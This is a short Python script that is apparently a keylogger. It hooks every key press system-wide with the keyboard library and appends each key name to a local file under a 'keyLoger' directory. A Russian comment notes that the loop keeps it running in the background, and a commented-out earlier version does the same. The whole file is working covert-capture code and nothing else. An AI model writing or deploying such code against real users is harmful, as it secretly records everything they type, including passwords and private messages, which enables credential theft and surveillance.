import keyboard
import subprocess
import threading
import time
def main():
    # with open('D:\\keyLoger\\file.txt', 'w') as f:
    #     def on_key_press(event):
    #         f.write(event.name + ';')
    #
    #
    #     keyboard.on_press(on_key_press)
    # # Бесконечный цикл, чтобы программа продолжала работать в фоне
    #     while True:
    #
    #         pass



    def on_key_press(event):
        f = open('D:\\keyLoger\\file.txt', 'a')
        f.write(f"{event.name}" + ";")


    keyboard.on_press(on_key_press)
    # Бесконечный цикл, чтобы программа продолжала работать в фоне
    while True:
        pass

if __name__ == '__main__':
    t = threading.Thread(target=main)
    t.start()
